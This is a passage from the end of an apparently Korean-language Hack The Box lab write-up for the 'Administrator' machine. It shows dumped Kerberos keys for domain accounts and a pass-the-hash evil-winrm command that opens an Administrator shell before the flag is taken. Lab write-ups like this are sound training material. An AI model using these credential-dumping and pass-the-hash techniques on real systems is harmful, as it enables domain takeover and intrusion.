administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 

```

획득한 NTLM hash로 administrator 접근

```bash
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ evil-winrm -i 10.129.7.207 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

root.txt 획득
![[Pasted image 20260313110716.png]]